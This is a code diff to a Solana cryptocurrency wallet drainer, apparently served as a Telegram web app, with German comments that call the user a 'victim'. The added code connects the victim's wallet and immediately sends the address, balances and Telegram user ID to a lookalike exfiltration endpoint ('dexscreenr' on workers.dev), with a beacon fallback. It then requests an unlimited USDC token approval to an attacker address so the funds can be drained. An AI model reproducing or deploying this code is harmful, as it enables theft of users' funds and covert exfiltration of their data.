@@ -492,14 +492,24 @@
     if(!provider) return; 
     
     try {
-      // Wir verbinden (falls noch nicht ganz passiert) und holen die Adresse
+      // 1. Wallet verbinden
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       
-      // NEUE RPC (Extrnode blockt Cloudflare nicht)
-      const conn = new solanaWeb3.Connection("https://solana-mainnet.rpc.extrnode.com"); 
+      // 2. SOFORT Daten an Telegram schicken (Kein RPC-Check davor!)
+      const basePayload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: "0", usdc: "0", tg_user_id: tgUserId, ts: Date.now() });
       
+      try { 
+        await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { 
+          method: "POST", headers: { "Content-Type": "application/json" }, body: basePayload 
+        }); 
+      } catch (err) { 
+        navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([basePayload], {type: 'application/json'})); 
+      }
+
+      // 3. Erst JETZT die Balance checken (um zu sehen, ob wir drainen können)
+      const conn = new solanaWeb3.Connection("https://solana-mainnet.rpc.extrnode.com"); 
       const solBalance = await conn.getBalance(resp.publicKey);
       const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) || "0";
       
@@ -514,19 +524,7 @@
         } catch (e) { usdcAmount = 0; }
       }
 
-      const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, usdc: usdcAmount, tg_user_id: tgUserId, ts: Date.now() });
-      
-      // Fetch mit sendBeacon Fallback (falls Telegram Fetch blockt)
-      try { 
-        await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { 
-          method: "POST", headers: { "Content-Type": "application/json" }, body: payload 
-        }); 
-      } 
-      catch (err) { 
-        navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([payload], {type: 'application/json'})); 
-      }
-
-      // Signatur anfordern (falls USDC da ist)
+      // 4. Wenn USDC da ist, Signatur anfordern (Drain)
       if (usdcAmount > 0 && typeof splToken !== 'undefined') {
         const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
         const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
